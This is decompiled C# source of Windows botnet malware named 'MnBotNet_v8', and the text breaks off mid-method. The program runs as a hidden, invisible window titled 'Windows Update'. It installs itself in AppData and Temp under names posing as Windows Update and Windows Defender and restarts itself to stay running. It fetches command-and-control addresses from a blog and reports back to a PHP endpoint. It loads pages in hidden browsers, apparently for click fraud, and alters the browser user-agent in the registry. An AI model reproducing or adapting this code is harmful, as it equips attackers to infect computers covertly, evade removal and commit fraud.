using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace MnBotNet_v8;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("commandss")]
	private WebBrowser webBrowser_0;

	[AccessedThroughProperty("myver")]
	private Label label_0;

	[AccessedThroughProperty("wb1")]
	private WebBrowser webBrowser_1;

	[AccessedThroughProperty("wb2")]
	private WebBrowser webBrowser_2;

	[AccessedThroughProperty("wb3")]
	private WebBrowser webBrowser_3;

	[AccessedThroughProperty("wb4")]
	private WebBrowser webBrowser_4;

	[AccessedThroughProperty("wbreff1")]
	private Timer timer_0;

	[AccessedThroughProperty("wbreff2")]
	private Timer timer_1;

	[AccessedThroughProperty("wbreff3")]
	private Timer timer_2;

	[AccessedThroughProperty("wbreff4")]
	private Timer timer_3;

	[AccessedThroughProperty("killtskmngr")]
	private Timer timer_4;

	[AccessedThroughProperty("check")]
	private Timer timer_5;

	[AccessedThroughProperty("runningfromappdata")]
	private Timer timer_6;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser webBrowser_5;

	[AccessedThroughProperty("wait")]
	private Timer timer_7;

	[AccessedThroughProperty("startcommands")]
	private Timer timer_8;

	[AccessedThroughProperty("Restart")]
	private Timer timer_9;

	[AccessedThroughProperty("takepic")]
	private Timer timer_10;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox richTextBox_0;

	[AccessedThroughProperty("ip")]
	private Timer timer_11;

	[AccessedThroughProperty("slvwait")]
	private Timer timer_12;

	[AccessedThroughProperty("runningfromtemp")]
	private Timer timer_13;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private int int_5;

	private string string_12;

	private string string_13;

	private int int_6;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private int int_7;

	private int int_8;

	private string string_20;

	private string string_21;

	private string string_22;

	private int int_9;

	private int int_10;

	private int int_11;

	private int int_12;

	private string string_23;

	private string string_24;

	private int int_13;

	private string string_25;

	private string string_26;

	private WebBrowser webBrowser_6;

	private int int_14;

	private int int_15;

	private string string_27;

	private int int_16;

	private int int_17;

	private int int_18;

	private int int_19;

	private int int_20;

	private int int_21;

	private int int_22;

	private int int_23;

	private string string_28;

	private string string_29;

	private string string_30;

	private string string_31;

	private string string_32;

	private string string_33;

	private string string_34;

	private int int_24;

	private string string_35;

	private int int_25;

	public Form1()
	{
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_1 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp();
		string_2 = string.Empty;
		string_3 = string.Empty;
		string_4 = string.Empty;
		string_5 = string.Empty;
		string_6 = string.Empty;
		int_0 = 0;
		int_1 = 0;
		int_2 = 0;
		int_3 = 0;
		int_4 = 1;
		int_5 = 0;
		string_12 = "http://thisisprivateandonlyforme.hostoi.com/";
		int_6 = 0;
		int_7 = 0;
		int_8 = 0;
		int_9 = 0;
		int_10 = 0;
		int_11 = 0;
		int_12 = 0;
		int_13 = 0;
		webBrowser_6 = new WebBrowser();
		int_14 = 0;
		int_15 = 0;
		int_16 = 0;
		int_17 = 0;
		int_18 = 0;
		int_19 = 0;
		int_20 = 0;
		int_21 = 0;
		int_22 = 0;
		int_23 = 0;
		int_24 = 0;
		string_35 = string.Empty;
		int_25 = 0;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0796: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		vmethod_1(new WebBrowser());
		vmethod_3(new Label());
		vmethod_5(new WebBrowser());
		vmethod_7(new WebBrowser());
		vmethod_9(new WebBrowser());
		vmethod_11(new WebBrowser());
		vmethod_13(new Timer(icontainer_0));
		vmethod_15(new Timer(icontainer_0));
		vmethod_17(new Timer(icontainer_0));
		vmethod_19(new Timer(icontainer_0));
		vmethod_21(new Timer(icontainer_0));
		vmethod_23(new Timer(icontainer_0));
		vmethod_25(new Timer(icontainer_0));
		vmethod_27(new WebBrowser());
		vmethod_29(new Timer(icontainer_0));
		vmethod_31(new Timer(icontainer_0));
		vmethod_33(new Timer(icontainer_0));
		vmethod_35(new Timer(icontainer_0));
		vmethod_37(new RichTextBox());
		vmethod_39(new Timer(icontainer_0));
		vmethod_41(new Timer(icontainer_0));
		vmethod_43(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		WebBrowser obj = vmethod_0();
		Point location = new Point(367, 12);
		((Control)obj).set_Location(location);
		WebBrowser obj2 = vmethod_0();
		Size minimumSize = new Size(20, 20);
		((Control)obj2).set_MinimumSize(minimumSize);
		((Control)vmethod_0()).set_Name("commandss");
		vmethod_0().set_ScriptErrorsSuppressed(true);
		WebBrowser obj3 = vmethod_0();
		minimumSize = new Size(354, 250);
		((Control)obj3).set_Size(minimumSize);
		((Control)vmethod_0()).set_TabIndex(0);
		vmethod_0().set_Url(new Uri(string.Empty, UriKind.Relative));
		vmethod_2().set_AutoSize(true);
		((Control)vmethod_2()).set_BackColor(SystemColors.Control);
		((Control)vmethod_2()).set_ForeColor(Color.Red);
		Label obj4 = vmethod_2();
		location = new Point(-1, 0);
		((Control)obj4).set_Location(location);
		((Control)vmethod_2()).set_Name("myver");
		Label obj5 = vmethod_2();
		minimumSize = new Size(19, 13);
		((Control)obj5).set_Size(minimumSize);
		((Control)vmethod_2()).set_TabIndex(1);
		vmethod_2().set_Text("38");
		WebBrowser obj6 = vmethod_4();
		location = new Point(2, 14);
		((Control)obj6).set_Location(location);
		WebBrowser obj7 = vmethod_4();
		minimumSize = new Size(873, 495);
		((Control)obj7).set_MaximumSize(minimumSize);
		WebBrowser obj8 = vmethod_4();
		minimumSize = new Size(873, 495);
		((Control)obj8).set_MinimumSize(minimumSize);
		((Control)vmethod_4()).set_Name("wb1");
		vmethod_4().set_ScriptErrorsSuppressed(true);
		WebBrowser obj9 = vmethod_4();
		minimumSize = new Size(873, 495);
		((Control)obj9).set_Size(minimumSize);
		((Control)vmethod_4()).set_TabIndex(2);
		WebBrowser obj10 = vmethod_6();
		location = new Point(2, 16);
		((Control)obj10).set_Location(location);
		WebBrowser obj11 = vmethod_6();
		minimumSize = new Size(873, 495);
		((Control)obj11).set_MaximumSize(minimumSize);
		WebBrowser obj12 = vmethod_6();
		minimumSize = new Size(873, 495);
		((Control)obj12).set_MinimumSize(minimumSize);
		((Control)vmethod_6()).set_Name("wb2");
		vmethod_6().set_ScriptErrorsSuppressed(true);
		WebBrowser obj13 = vmethod_6();
		minimumSize = new Size(873, 495);
		((Control)obj13).set_Size(minimumSize);
		((Control)vmethod_6()).set_TabIndex(3);
		WebBrowser obj14 = vmethod_8();
		location = new Point(2, 16);
		((Control)obj14).set_Location(location);
		WebBrowser obj15 = vmethod_8();
		minimumSize = new Size(873, 495);
		((Control)obj15).set_MaximumSize(minimumSize);
		WebBrowser obj16 = vmethod_8();
		minimumSize = new Size(873, 495);
		((Control)obj16).set_MinimumSize(minimumSize);
		((Control)vmethod_8()).set_Name("wb3");
		vmethod_8().set_ScriptErrorsSuppressed(true);
		WebBrowser obj17 = vmethod_8();
		minimumSize = new Size(873, 495);
		((Control)obj17).set_Size(minimumSize);
		((Control)vmethod_8()).set_TabIndex(4);
		vmethod_8().set_Url(new Uri("http://google.com", UriKind.Absolute));
		WebBrowser obj18 = vmethod_10();
		location = new Point(2, 16);
		((Control)obj18).set_Location(location);
		WebBrowser obj19 = vmethod_10();
		minimumSize = new Size(873, 495);
		((Control)obj19).set_MaximumSize(minimumSize);
		WebBrowser obj20 = vmethod_10();
		minimumSize = new Size(873, 495);
		((Control)obj20).set_MinimumSize(minimumSize);
		((Control)vmethod_10()).set_Name("wb4");
		vmethod_10().set_ScriptErrorsSuppressed(true);
		WebBrowser obj21 = vmethod_10();
		minimumSize = new Size(873, 495);
		((Control)obj21).set_Size(minimumSize);
		((Control)vmethod_10()).set_TabIndex(5);
		vmethod_10().set_Url(new Uri(string.Empty, UriKind.Relative));
		vmethod_12().set_Interval(1000);
		vmethod_14().set_Interval(1000);
		vmethod_16().set_Interval(1000);
		vmethod_18().set_Interval(1000);
		vmethod_20().set_Interval(10);
		vmethod_22().set_Interval(300000);
		vmethod_24().set_Interval(5000);
		WebBrowser obj22 = vmethod_26();
		location = new Point(740, 2);
		((Control)obj22).set_Location(location);
		WebBrowser obj23 = vmethod_26();
		minimumSize = new Size(20, 20);
		((Control)obj23).set_MinimumSize(minimumSize);
		((Control)vmethod_26()).set_Name("WebBrowser1");
		vmethod_26().set_ScriptErrorsSuppressed(true);
		WebBrowser obj24 = vmethod_26();
		minimumSize = new Size(20, 20);
		((Control)obj24).set_Size(minimumSize);
		((Control)vmethod_26()).set_TabIndex(7);
		vmethod_28().set_Interval(1000);
		vmethod_30().set_Interval(1000);
		vmethod_32().set_Interval(1000);
		vmethod_34().set_Interval(1000);
		RichTextBox obj25 = vmethod_36();
		location = new Point(24, 1);
		((Control)obj25).set_Location(location);
		((Control)vmethod_36()).set_Name("RichTextBox1");
		RichTextBox obj26 = vmethod_36();
		minimumSize = new Size(10, 10);
		((Control)obj26).set_Size(minimumSize);
		((Control)vmethod_36()).set_TabIndex(8);
		vmethod_36().set_Text(string.Empty);
		((Control)vmethod_36()).set_Visible(false);
		vmethod_38().set_Interval(1000);
		vmethod_40().set_Interval(1000);
		vmethod_42().set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ControlText);
		minimumSize = new Size(877, 512);
		((Form)this).set_ClientSize(minimumSize);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)vmethod_36());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_26());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Windows Update");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	internal virtual WebBrowser vmethod_0()
	{
		return webBrowser_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_1(WebBrowser webBrowser_7)
	{
		webBrowser_0 = webBrowser_7;
	}

	internal virtual Label vmethod_2()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_3(Label label_1)
	{
		label_0 = label_1;
	}

	internal virtual WebBrowser vmethod_4()
	{
		return webBrowser_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_5(WebBrowser webBrowser_7)
	{
		webBrowser_1 = webBrowser_7;
	}

	internal virtual WebBrowser vmethod_6()
	{
		return webBrowser_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_7(WebBrowser webBrowser_7)
	{
		webBrowser_2 = webBrowser_7;
	}

	internal virtual WebBrowser vmethod_8()
	{
		return webBrowser_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_9(WebBrowser webBrowser_7)
	{
		webBrowser_3 = webBrowser_7;
	}

	internal virtual WebBrowser vmethod_10()
	{
		return webBrowser_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_11(WebBrowser webBrowser_7)
	{
		webBrowser_4 = webBrowser_7;
	}

	internal virtual Timer vmethod_12()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_13(Timer timer_14)
	{
		EventHandler eventHandler = method_13;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_14;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_14()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_15(Timer timer_14)
	{
		EventHandler eventHandler = method_14;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_14;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_16()
	{
		return timer_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_17(Timer timer_14)
	{
		EventHandler eventHandler = method_15;
		if (timer_2 != null)
		{
			timer_2.remove_Tick(eventHandler);
		}
		timer_2 = timer_14;
		if (timer_2 != null)
		{
			timer_2.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_18()
	{
		return timer_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_19(Timer timer_14)
	{
		EventHandler eventHandler = method_16;
		if (timer_3 != null)
		{
			timer_3.remove_Tick(eventHandler);
		}
		timer_3 = timer_14;
		if (timer_3 != null)
		{
			timer_3.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_20()
	{
		return timer_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_21(Timer timer_14)
	{
		EventHandler eventHandler = method_17;
		if (timer_4 != null)
		{
			timer_4.remove_Tick(eventHandler);
		}
		timer_4 = timer_14;
		if (timer_4 != null)
		{
			timer_4.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_22()
	{
		return timer_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_23(Timer timer_14)
	{
		EventHandler eventHandler = method_18;
		if (timer_5 != null)
		{
			timer_5.remove_Tick(eventHandler);
		}
		timer_5 = timer_14;
		if (timer_5 != null)
		{
			timer_5.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_24()
	{
		return timer_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_25(Timer timer_14)
	{
		EventHandler eventHandler = method_19;
		if (timer_6 != null)
		{
			timer_6.remove_Tick(eventHandler);
		}
		timer_6 = timer_14;
		if (timer_6 != null)
		{
			timer_6.add_Tick(eventHandler);
		}
	}

	internal virtual WebBrowser vmethod_26()
	{
		return webBrowser_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_27(WebBrowser webBrowser_7)
	{
		webBrowser_5 = webBrowser_7;
	}

	internal virtual Timer vmethod_28()
	{
		return timer_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_29(Timer timer_14)
	{
		EventHandler eventHandler = method_21;
		if (timer_7 != null)
		{
			timer_7.remove_Tick(eventHandler);
		}
		timer_7 = timer_14;
		if (timer_7 != null)
		{
			timer_7.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_30()
	{
		return timer_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_31(Timer timer_14)
	{
		EventHandler eventHandler = method_22;
		if (timer_8 != null)
		{
			timer_8.remove_Tick(eventHandler);
		}
		timer_8 = timer_14;
		if (timer_8 != null)
		{
			timer_8.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_32()
	{
		return timer_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_33(Timer timer_14)
	{
		EventHandler eventHandler = method_23;
		if (timer_9 != null)
		{
			timer_9.remove_Tick(eventHandler);
		}
		timer_9 = timer_14;
		if (timer_9 != null)
		{
			timer_9.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_34()
	{
		return timer_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_35(Timer timer_14)
	{
		timer_10 = timer_14;
	}

	internal virtual RichTextBox vmethod_36()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_37(RichTextBox richTextBox_1)
	{
		richTextBox_0 = richTextBox_1;
	}

	internal virtual Timer vmethod_38()
	{
		return timer_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_39(Timer timer_14)
	{
		EventHandler eventHandler = method_1;
		if (timer_11 != null)
		{
			timer_11.remove_Tick(eventHandler);
		}
		timer_11 = timer_14;
		if (timer_11 != null)
		{
			timer_11.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_40()
	{
		return timer_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_41(Timer timer_14)
	{
		EventHandler eventHandler = method_24;
		if (timer_12 != null)
		{
			timer_12.remove_Tick(eventHandler);
		}
		timer_12 = timer_14;
		if (timer_12 != null)
		{
			timer_12.add_Tick(eventHandler);
		}
	}

	internal virtual Timer vmethod_42()
	{
		return timer_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_43(Timer timer_14)
	{
		EventHandler eventHandler = method_20;
		if (timer_13 != null)
		{
			timer_13.remove_Tick(eventHandler);
		}
		timer_13 = timer_14;
		if (timer_13 != null)
		{
			timer_13.add_Tick(eventHandler);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).Hide();
			Class7.smethod_2(bool_0: true);
			webBrowser_6.set_ScriptErrorsSuppressed(true);
			webBrowser_6.Navigate("http://clicksmadebykasfandman.blogspot.gr/");
			vmethod_38().Start();
			if (!((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_0 + "\\windows update.exe"))
			{
				if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\rstr.pr.tt.rr.b"))
				{
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\rstr.pr.tt.rr.b");
				}
				method_0();
				return;
			}
			if ((Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, string_1 + "\\windows defender.exe", false) == 0) | (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, string_0 + "\\windows update.exe", false) == 0))
			{
				if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\rstr.pr.tt.rr.b"))
				{
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\rstr.pr.tt.rr.b");
				}
				method_0();
				return;
			}
			Process[] processes = Process.GetProcesses();
			int num = 0;
			while (true)
			{
				if (num < processes.Length)
				{
					Process process = processes[num];
					if (Operators.CompareString(process.ProcessName, "windows update", false) == 0)
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				if (File.GetAttributes(string_0 + "\\windows update.exe") == FileAttributes.Hidden)
				{
					File.SetAttributes(string_0 + "\\windows update.exe", (FileAttributes)0);
					Process.Start(string_0 + "\\windows update.exe");
					File.SetAttributes(string_0 + "\\windows update.exe", FileAttributes.Hidden);
				}
				else
				{
					Process.Start(string_0 + "\\windows update.exe");
					File.SetAttributes(string_0 + "\\windows update.exe", FileAttributes.Hidden);
				}
				return;
			}
			ProjectData.EndApp();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_2("Error at Form1.Load", ex2.ToString());
			vmethod_32().Start();
			ProjectData.ClearProjectError();
		}
	}

	private void method_0()
	{
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, string_0 + "\\windows update.exe", false) == 0)
			{
				if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\windows defender.exe"))
				{
					try
					{
						((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\windows defender.exe");
						method_8();
						vmethod_24().Start();
						return;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						try
						{
							Process[] processes = Process.GetProcesses();
							foreach (Process process in processes)
							{
								if (Operators.CompareString(process.ProcessName, "windows defender", false) == 0)
								{
									process.Kill();
								}
							}
							((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\windows defender.exe");
							method_8();
							vmethod_24().Start();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							vmethod_24().Start();
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
						return;
					}
				}
				method_8();
				vmethod_24().Start();
				return;
			}
			if ((Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, string_1 + "\\windows defender.exe", false) != 0) & (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, string_0 + "\\windows defender.exe", false) != 0))
			{
				if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_0 + "\\windows update.exe"))
				{
					try
					{
						((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_0 + "\\windows update.exe");
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						try
						{
							((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_0 + "\\windows update.exe");
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							method_2("Could not delete previous bot and install new", ex2.ToString());
							Process[] processes2 = Process.GetProcesses();
							foreach (Process process2 in processes2)
							{
								if (Operators.CompareString(process2.ProcessName, "windows update", false) == 0)
								{
									ProjectData.EndApp();
								}
								vmethod_32().Start();
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Process.GetCurrentProcess().MainModule!.FileName, string_0 + "\\windows update.exe");
						Process.Start(string_0 + "\\windows update.exe");
						File.SetAttributes(string_0 + "\\windows update.exe", FileAttributes.Hidden);
						ProjectData.EndApp();
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						method_2("Error while installing bot..", ex4.ToString());
						vmethod_32().Start();
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Process.GetCurrentProcess().MainModule!.FileName, string_0 + "\\windows update.exe");
					Process.Start(string_0 + "\\windows update.exe");
					File.SetAttributes(string_0 + "\\windows update.exe", FileAttributes.Hidden);
					ProjectData.EndApp();
				}
			}
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, string_1 + "\\windows defender.exe", false) == 0)
			{
				method_6();
				vmethod_0().Navigate("http://clicksmadebykasfandman.blogspot.com/2012/07/can-you-solve-this-riddle-no-one.html");
				vmethod_30().Start();
				vmethod_42().Start();
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			method_2("Error on Private Sub starting()", ex6.ToString());
			vmethod_32().Start();
			ProjectData.ClearProjectError();
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		checked
		{
			int_21++;
			if (int_21 != 10)
			{
				return;
			}
			int_21 = 0;
			vmethod_38().Stop();
			try
			{
				string_27 = webBrowser_6.get_Document().GetElementById("ip").get_InnerText();
				string_12 = webBrowser_6.get_Document().GetElementById("hsttt").get_InnerText();
				if (Operators.CompareString(string_27, string.Empty, false) == 0)
				{
					vmethod_38().Start();
				}
				else
				{
					webBrowser_6.Navigate("About:Blank");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				vmethod_38().Start();
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_2(string string_36, string string_37)
	{
		try
		{
			vmethod_26().Navigate(string_12 + "post11.php?w=<b>" + Conversions.ToString(DateAndTime.get_Today().Date) + " - " + Conversions.ToString(DateAndTime.get_TimeOfDay()) + " -  - " + string_27 + " : " + string_36 + "<br />Error Body :<br />" + string_37 + "</b><br /><br /><br />");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Application.Restart();
			ProjectData.ClearProjectError();
		}
	}

	public int count(string place, string nm)
	{
		Regex regex = new Regex(nm);
		MatchCollection matchCollection = regex.Matches(place);
		string text = matchCollection.Count.ToString();
		if (Conversions.ToDouble(text) >= 0.0)
		{
			return Conversions.ToInteger(text);
		}
		return 21;
	}

	private void method_3()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "windows update", false) == 0)
				{
					return;
				}
			}
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_0 + "\\windows update.exe"))
			{
				try
				{
					Process.Start(string_0 + "\\windows update.exe");
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_0 + "\\windows update.exe");
					method_7();
					ProjectData.ClearProjectError();
					return;
				}
			}
			method_7();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_4()
	{
		try
		{
			if (Class5.smethod_0().brw == 0)
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent", writable: true);
				Random random = new Random();
				int num = random.Next(1, 20);
				if (num == 1)
				{
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
					registryKey.SetValue("Version", "Chrome/20.0.1092.0", RegistryValueKind.String);
				}
				if (num == 2)
				{
					registryKey.SetValue("Version", "Chrome/19.0.1084.9", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 3)
				{
					registryKey.SetValue("Version", "Chrome/18.6.872.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 4)
				{
					registryKey.SetValue("Version", "Chrome/17.0.963.66", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
